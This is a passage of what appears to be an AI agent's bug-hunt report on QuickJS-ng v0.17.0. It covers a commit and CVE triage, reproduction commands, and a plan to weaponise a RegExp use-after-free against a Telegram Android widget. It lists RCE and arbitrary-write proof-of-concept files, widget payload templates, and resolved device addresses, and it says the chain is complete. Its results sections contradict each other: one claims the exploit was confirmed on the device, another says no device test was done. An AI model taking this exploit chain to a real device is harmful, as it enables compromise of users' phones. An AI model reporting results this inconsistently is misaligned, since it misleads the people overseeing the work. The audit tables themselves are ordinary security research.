`resolve_variables()` decodes it with `get_u32`, reading up to 4 bytes past a 48-byte
buffer. The app *can* force parser OOM (6 MiB), so the read is reachable, but it is an
OOB **read** into the adjacent chunk — crash-only at best, and not reproduced here. Low.

**PR #1790 — iterator fast-path stack overflow** (<https://github.com/quickjs-ng/quickjs/pull/1790>, open).
`JS_IteratorNext2` calls a builtin `next` without `js_call_c_function`'s stack check, so
`it = it.map(x=>x)` × 1e5 segfaults on master. Under the app model: 10 000 links throws
`RangeError: Maximum call stack size exceeded`; 30 000 and 60 000 hit the 6 MiB limit
(`out of memory`) before any overflow. Crash-only even when reachable, so not a target.

---

## 6. Commit / issue / advisory audit (2026-09-18 → 2026-11-01)

### 6.1 Commits in `v0.17.0..v0.18.0` (35 total), memory-relevant subset

| Commit | Date | What | In v0.17.0? | App has it? |
|---|---|---|---|---|
| `25a005b` #1844 | 10-30 | WeakMap symbol-value UAF fix | no (fix) | no — excluded, other agents |
| `7a23d8e` | 10-24 | leak in `JS_ReadBigInt` on truncated input | no | n/a (leak) |
| `081d50c` | 10-18 | infinite loop on allocation failure in `unicode_script()` | no | no (OOM-only DoS) |
| `c359cac` #1811 | 10-09 | template-literal substitution codegen; **removes atom `concat`** | no | no (also the snapshot fingerprint) |
| `293ba08` | 10-07 | leak in `JSON.stringify` on index conversion failure | no | n/a (leak) |
| `0db3949` #1780 | 10-06 | evaluation order of computed property assignment | no | no (codegen correctness) |
| `970500f` #1734 | 10-06 | `Reflect.set` with undefined receiver | no | no (correctness) |
| `6a9b531` | 10-01 | bound-function prototype propagation | no | no (correctness) |
| `8e14a39` | 10-01 | UAF when `JS_NewContext` runs out of memory | no | no — but only at context creation, not attacker-reachable |
| `19dbe85` #1741 | 09-24 | `String.prototype.repeat` large count on empty string | no | no (correctness/DoS) |
| `c1ed194` #1832 | 10-30 | `Array.fromAsync` internal call instead of `.call` lookup | no | no (hardening) |
| `d4cd8f4` | 10-30 | async dynamic `import()` | no | no (new feature) |
| `90aa2c4` #1810, `db0fe52` #1814 | 10-08/09 | OOM / InternalError uncatchable | no | no (policy) |
| `876442b` #1802 | 10-05 | `JSInterruptHandler` gets `JSContext*` | no | no (API change) |
| `60984dc` | 10-07 | GC-on-new-object heuristic | no | no (behavior) |
| remainder | — | CI, docs, mimalloc, WASI, performance | — | — |

None of these is an app-reachable memory-corruption bug except the excluded #1844.

### 6.1b Full commit list `v0.17.0..v0.18.0` (35), classification

```
d7215b0 2026-11-01 Set version to 0.18.0                                  release
7b5f588 2026-10-30 Use $RUNNER_TEMP instead of /tmp in CI recipes          CI
c1ed194 2026-10-30 Array.fromAsync: use internal call (#1795) (#1832)      hardening
25a005b 2026-10-30 Fix UAF when freeing WeakMap with symbol values (#1844) MEMORY (excluded)
d4cd8f4 2026-10-30 Support asynchronous dynamic import()                   feature
cea851c 2026-10-30 Run-time detect os.platform for Cosmopolitan libc       platform
231400a 2026-10-30 Add cosmopolitan libc release build                     platform
11e08c0 2026-10-30 Add cosmopolitan libc CI job                            CI
7a23d8e 2026-10-24 Fix leak in JS_ReadBigInt on truncated input            leak
e680786 2026-10-23 Export indirect function table in the WASI reactor      WASI
270b8c9 2026-10-20 Export all API symbols in the QJS_WASI_REACTOR build    WASI
081d50c 2026-10-18 Fix infinite loop on allocation failure in unicode_script OOM/DoS
5271a40 2026-10-16 Upgrade macos-14 runners to macos-15                  CI
9b06171 2026-10-11 Explain new security policy in SECURITY.md             docs
c359cac 2026-10-09 Fix template literal substitution (#1811)              codegen (+atom table)
db0fe52 2026-10-09 Make InternalErrors uncatchable by JS code             policy
dad13e3 2026-10-08 docs: add DuckDB QuickJS extension                      docs
90aa2c4 2026-10-08 Make OOM exceptions uncatchable by JS code             policy
60984dc 2026-10-07 Tweak new object GC heuristic                          GC behavior
293ba08 2026-10-07 Fix leak in JSON.stringify ...                          leak
a6b82a3 2026-10-06 Record the source location of import() calls           diagnostics
0db3949 2026-10-06 Fix evaluation order of computed property assignment    codegen
970500f 2026-10-06 Return false instead of error in Reflect.set           correctness
140b26d 2026-10-06 Accept Unicode spaces in Date.parse                    correctness
876442b 2026-10-05 Pass JSContext to JSInterruptHandler                   API
90c3922 2026-10-02 Use mi_usable_size for the mimalloc usable-size hook   allocator
6a9b531 2026-10-01 Ensure function prototype is propagated when bound     correctness
8eb27e3 2026-10-01 Update MSVC version for ARM64 builds in CI             CI
1ea7ebd 2026-10-01 Fix os.poll dispatch with multiple fds                 os module
8e14a39 2026-10-01 Fix use-after-free when JS_NewContext runs out of mem  MEMORY (context-create OOM only)
ab9d4d9 2026-10-01 Fix precision loss in performance.now()               correctness
2f0aa72 2026-09-28 Port bellard/quickjs@10c81b1 (GCC 14+ perf)            perf
19dbe85 2026-09-24 Fix large String.prototype.repeat on empty string      correctness/DoS
e0f3471 2026-09-24 Use built-in methods in bjson test                     tests
```

No commit in the window other than the excluded `25a005b` fixes an app-reachable
memory-corruption bug in v0.17.0's attack surface.

### 6.2 Issues / PRs opened or updated in the window (170 fetched), memory-safety triage

* **#1865** captured-var truncation — see §4 (not reachable at 6 MiB).
* **#1827** RegExp deletion UAF — see §3 (top candidate).
* **#1853** `JS_ReadFunctionTag` cpool_count overflow — requires `JS_ReadObject` bytecode;
  not reachable (widget JS never deserializes bytecode).
* **#1782** parser OOM OOB read — app-reachable, low impact.
* **#1833** failed module link leaves orphan var_refs → `JS_FreeRuntime` abort — modules,
  not reachable (classic scripts).
* **#1762** context without Promise intrinsic leaks async bytecode — raw contexts, not
  reachable.
* **#1790** iterator fast-path stack overflow — OOM/stack-check gated, crash only.
* **#1838 / #1743 / #1777 / #1793 / #1747** async/await/generator/iterator-close
  correctness — no memory-safety primitive found.
* **#1856 / #1857 / #1756 / #1791 / #1753** missing interrupt polls in native loops —
  availability only; irrelevant to a widget that must not be interrupted.
* **#1845 / #1846 / #1850 / #1836 / #1748** leaks and BJSON — leaks/correctness.
* **#1847 / #1770** TypedArray species content type — semantic; slice's fast path guards on
  `class_id` and falls back to generic Get/Set, so no type confusion. Verified by source.
* **#1760 / #1761 / #1729** ArrayBuffer/SharedArrayBuffer ToIndex — modulo-2^64 conversion,
  then the length is validated; semantic only.
* **#1816** `apply` argument-list length — correctness (`ToLength` vs `ToUint32`).
* **#1815** Map/Set hash seed — hash-flood DoS, not memory safety.
* **#1821** unresolved labels in cyclic jump chains — miscompilation of jumps; no memory
  primitive shown; left as a possible follow-up (a wrong pc could in principle walk past a
  function's bytecode, but the bytecode is self-compiled and bounded by the compiler).
* **#1739 / #1768 / #1767 / #1765 / #1759 / #1738 / #1729** evaluation/validation order —
  spec compliance.

### 6.3 Advisories / CVE cross-check

* GitHub security advisories for `quickjs-ng/quickjs`: **10 advisories**, all published
  2026-05-28..2026-07-31, every one fixed in **≤ 0.16.0** (CallSite OOM UAF, Promise
  reject OOM UAF, regexp alternation OOM OOB write, JSON rope pointer leak, BigInt leak in
  Atomics.store, 32-bit TypedArray sort overflow, 32-bit Proxy ownKeys overflow, external
  ArrayBuffer transfer UAF, `set_array_length` UAF, `toReversed` dense-array GC bug).
  None applies to v0.17.0.
* NVD keyword `quickjs`: 30 CVEs, latest affecting quickjs-ng are CVE-2026-0821/0822/1144/
  1145 (≤ 0.11.0) and CVE-2025-46687/46688 (≤ 0.9.0); the 2025-6249x series targets
  bellard/quickjs, not quickjs-ng. **No CVE affects ≥ 0.17.0.**
* OSV: no `quickjs-ng` entries (OSS-Fuzz ecosystem query empty).

---

## 7. Source-audit coverage (v0.17.0)

Reviewed for missing bounds checks, refcount over-decrement, list-node UAF during
iteration, size-arithmetic overflow and attacker-controlled index arithmetic:

* **libregexp**: `lre_exec` header/`capture_count`/`alloc_count`, `SAVE_CAPTURE*`,
  `set_i32`/`loop`/`set_char_pos`/`check_advance`, `save_start/end/reset`, range ops,
  backtracking stack, `lre_check_bytecode`. → found the unchecked register index used by
  #1827; the save/range ops are otherwise checked against `capture_count`.
* **RegExp object lifecycle**: `js_compile_regexp` (INDIRECT bytecode string),
  `js_regexp_exec` (correct order), `JS_RegExpDelete` (wrong order — #1827),
  `Symbol.match/matchAll/split/search/replace` entry points.
* **Map/Set/WeakMap/WeakRef/FinalizationRegistry**: finalizer/`reset_weak_ref` interaction
  (the #1835 class — excluded); no second instance found in `js_finrec_finalizer`,
  `js_weakref` or the map iterator paths.
* **Typed arrays / ArrayBuffer**: species create, slice/map/filter fast paths (class_id
  guard), `typed_array_is_oob`, resize/grow/transfer argument handling, `with`.
* **strings/atoms**: rope vs normal/slice/indirect, `str8`/`strv`, atom table resize.
* **JSON**: stringify/parse recursion and OOM paths (leaks only).
* **Proxy/Reflect**: trap result validation and invariant checks (correctness issues).
* **async/generators/promises/`using`**: excluded #1570 family; #1865 is the only
  memory-safety finding and is size-gated.
* **BigInt**: bjson read path (leak), string conversion.
* **WebAssembly**: not compiled into the app.

---

## 8. Reproduction (exact commands)

Everything is under `/tmp/opencode/qjs_bughunt` (copied to the project lab, see §10).

```sh
# build v0.17.0
git clone --filter=blob:none https://github.com/quickjs-ng/quickjs.git qjsng
cd qjsng && git checkout v0.17.0
cmake -B build-asan -DCMAKE_BUILD_TYPE=Debug -DQJS_ENABLE_ASAN=ON -DQJS_ENABLE_UBSAN=ON
cmake --build build-asan -j8
cmake -B build-rel -DCMAKE_BUILD_TYPE=Release
cmake --build build-rel -j8

# app-model harness (6 MiB, per-eval CPU deadline, no teardown)
clang -O1 -g -fsanitize=address -I . appmodel.c build-asan/libqjs.a -lm -lpthread -o appmodel_asan
clang -O2 -I . appmodel.c build-rel/libqjs.a -lm -lpthread -o appmodel_rel

# 1) UAF proof (ASan): fake header/program, capture_count=33, set_i32 reg 255
ASAN_OPTIONS=quarantine_size_mb=0:thread_local_quarantine_size_kb=0 \
  ./build-asan/qjs poc1827_oob11k.js
# -> heap-buffer-overflow READ of size 8 in lre_exec_backtrack libregexp.c:3121
#    [exec] set_i32 capture=... capture_count=33 idx=321 off=2568 val=1094861636
#    (66-slot/528-byte capture array, access 2568 B from its start; store follows)

# 2) app model, 6 MiB, 300 ms, two scripts, no teardown
./appmodel_rel 6 300 poc1827_oob_app.js poc1827_check.js
# -> [eval 1] ok, [eval 2] ok, mem ~114 KB, no teardown

# 3) survival / corruption rate (release)
for i in $(seq 1 40); do ./build-rel/qjs poc1827_oob11k.js >/dev/null 2>&1 || echo crash; done
# -> 19 survived / 21 SIGSEGV
```

Raw outputs are embedded in §3.5 and §4.

---

## 9. Recommendation / next steps

1. **#1827: device-confirmed DoS, lab-confirmed RCE.** The device reached `lre_exec` and
   SIGABRTed on the minimal fake program (§3D), proving the fast path and fake-bytecode
   execution on hardware. The remaining device step is the class-80 neighbour calibration,
   owned by the arena agent's multi-string scan; this report will validate that payload
   when it lands.
2. **Do not run more fixed-geometry (v3) variants on the device.** The phone's arena state
   differs (`NO_ANCHOR` on every value); only the scan-based calibration is likely to
   work, and it should stay a single coordinated device payload.
3. Device constants are resolved (`js_def_free=0x1739aec`, `free@GOT=0x1960430`,
   `system-free=0x26df0`); no TODOs remain in the chain. The earlier open allocator
   question (Scudo reuse of the 11 623-byte chunk) is answered positively by the device
   SIGABRT: the reclaim worked on hardware.
4. Keep #1865 on the shelf: if the 6 MiB figure turns out to be a per-context or per-script
   budget rather than a hard runtime limit (or if a second, larger context is reachable),
   it becomes the strongest remaining candidate (upstream claims RCE).
5. Do not spend more time on #1782/#1790 (crash-only / gated) or on the BJSON/module/
   typed-array-species issues (not reachable or not memory-unsafe).

---

## 10. Artifacts

* Report (this file): `/tmp/opencode/qjs_bug_hunt_20261101.md`
* Copy: `<HOME>/ailocal/Telegram/telegramandroidwidget/notes/qjs_bug_hunt_20261101.md`
* Harness + PoCs: `<HOME>/ailocal/Telegram/telegramandroidwidget/lab/qjs_bughunt/`
  * `appmodel.c` — 6 MiB / CPU-deadline / multi-eval / no-teardown harness
  * `poc1827_oob_app.js`, `poc1827_check.js` — app-model PoC + continuation check
  * `poc1827_oob.js`, `poc1827_oob11k.js` — ASan/release OOB PoC (11623-byte reclaim)
  * `poc1827_fake3.js`, `probe_reclaim3.js` — reclaim proof
  * `poc1827_len.js` — controlled write into `JSString.len` + OOB read leak
  * `poc1827_count.js`, `poc1827_ta.js` — `u.array.count` hit + byte OOB read/write window
  * `poc1827_arbwrite.js` — arbitrary-address byte read/write (retargeted view)
  * `poc1827_leakrt.js`, `poc1827_rce.js`, `poc1827_rce_app.js` — ctx/rt/libc leak and
    full allocator-hook RCE (lab and app-model variants)
  * `widget_poc_1827_rce.html`, `widget_lab_1827.html` — widget payload templates
  * `poc1865.js`, `gen1865.py` — captured-var truncation PoC (needs ≥10 MiB)
  * `RESULTS.md` — raw command outputs
  * `build.sh` — rebuilds the v0.17.0 ASan/release lab and both harness binaries

(#1835 / #1570 artifacts deliberately not duplicated here; those agents own them.)

## 11. Limitations / honesty

* No device test; all results are on x86-64 Linux with glibc. Android uses Scudo; the
  reclaim argument relies on Scudo's documented 2 KB quarantine bound but was not measured
  on the phone.
* The #1827 neighbour-overwrite step is *not* demonstrated; the OOB access, its offset
  formula, the attacker reclaim and the fake-bytecode execution are.
* "Crash" ≠ "RCE". The ranked #1 is a memory-corruption primitive, not an exploit chain.
* The 6 MiB figure is taken from the project's prior RE (hard-coded `JS_SetMemoryLimit`);
  #1865's dismissal depends on it.
